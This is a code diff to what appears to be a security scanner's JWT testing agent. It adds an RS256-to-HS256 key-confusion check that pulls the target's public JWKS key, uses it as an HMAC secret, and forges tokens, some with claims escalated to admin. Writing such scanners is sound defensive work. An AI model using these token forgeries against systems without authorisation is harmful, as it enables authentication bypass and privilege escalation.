@@ -27,7 +27,7 @@ success status — or 401/403→200 auth-bypass — non-trivial body, size withi
 from __future__ import annotations
 
 import re
-from typing import TYPE_CHECKING, Dict, List, Tuple
+from typing import Optional, TYPE_CHECKING, Dict, List, Tuple
 
 from dast.ai.agent_base import AgentFinding, VulnAgent
 from dast.ai.coordinator import Coordinator
@@ -104,8 +104,35 @@ def _accepted(resp, baseline_status: int, baseline_len: int) -> bool:
     return 0.7 <= size_ratio <= 1.3
 
 
-def _forged_variants(token: str) -> List[Tuple[str, str]]:
-    """(label, forged_token) attack set — alg:none, weak-HMAC, escalation, kid."""
+async def _fetch_hs_secrets(client: "httpx.AsyncClient",
+                            target: "CheckTarget") -> List[str]:
+    """Same-host jwks → HMAC secret candidates for the RS256→HS256 confusion.
+    Silent skip: no jwks reachable means the variant is not applicable."""
+    from urllib.parse import urlparse as _up
+    try:
+        p = _up(target.url)
+        base = f"{p.scheme}://{p.netloc}"
+        resp = await client.get(f"{base}/.well-known/jwks.json")
+        keys = (resp.json() or {}).get("keys", [])
+        for k in keys:
+            if k.get("kty") == "RSA" and k.get("n"):
+                n = str(k["n"])
+                cands = [n]
+                try:
+                    import base64 as _b64
+                    raw = _b64.urlsafe_b64decode(n + "=" * (-len(n) % 4)).decode("latin-1")
+                    cands.append(raw)
+                except Exception:
+                    pass
+                return cands
+    except Exception:
+        pass
+    return []
+
+
+def _forged_variants(token: str, hs_secrets: Optional[List[str]] = None) -> List[Tuple[str, str]]:
+    """(label, forged_token) attack set — alg:none, weak-HMAC, RS256→HS256
+    key confusion (4-B), escalation, kid."""
     decoded = decode_jwt(token)
     if not decoded:
         return []
@@ -145,7 +172,21 @@ def _forged_variants(token: str) -> List[Tuple[str, str]]:
             forged_header = dict(header, kid=kid)
             variants.append((f"kid injection {kid!r}",
                              build_token(forged_header, payload, secret="")))
-    return variants[:_MAX_VARIANTS]
+    # 5) RS256→HS256 key confusion (4-B, ARTEX api-security P2): a verifier
+    # that validates RS256 tokens but accepts HS256 with the PUBLIC key
+    # material as the HMAC secret. Candidates: the jwks `n` string verbatim
+    # and its raw decoded bytes (the two common naive implementations).
+    for secret in (hs_secrets or []):
+        hs_header = dict(header, alg="HS256")
+        variants.append((f"RS256->HS256 key confusion (secret={secret[:16]}..., original claims)",
+                         build_token(hs_header, payload, secret=secret)))
+        escalated2 = dict(payload)
+        for key in _ESCALATION_KEYS:
+            if key in escalated2:
+                escalated2[key] = "admin" if key != "roles" else ["admin"]
+        variants.append(("RS256->HS256 key confusion (escalated claims)",
+                         build_token(hs_header, escalated2, secret=secret)))
+    return variants[:_MAX_VARIANTS + 4]
 
 
 def _encode_json(obj) -> str:
@@ -172,6 +213,17 @@ class JwtAgent(VulnAgent):
             return []
 
         for token, param in tokens:
+            # 4-B: RS256 tokens get the key-confusion variants when a same-host
+            # jwks is reachable (public key material as the HMAC secret).
+            hs_secrets: List[str] = []
+            try:
+                from dast.utils.jwt import decode_jwt_header
+                header_probe = decode_jwt_header(token)
+                if str(header_probe.get("alg", "")).upper() == "RS256":
+                    hs_secrets = await _fetch_hs_secrets(client, target)
+            except Exception:
+                hs_secrets = []
+
             # Baseline: the request AS the operator captured it.
             baseline = await probe_common.send_probe(target, client, param,
                                                      param.get("value", ""), send=_SEND)
@@ -191,7 +243,7 @@ class JwtAgent(VulnAgent):
                             url=target.url)
                 continue
 
-            for label, forged in _forged_variants(token):
+            for label, forged in _forged_variants(token, hs_secrets=hs_secrets):
                 # Preserve the captured scheme: an "Authorization: Bearer <jwt>"
                 # source must send "Bearer <forged>", not the bare token.
                 scheme = ""
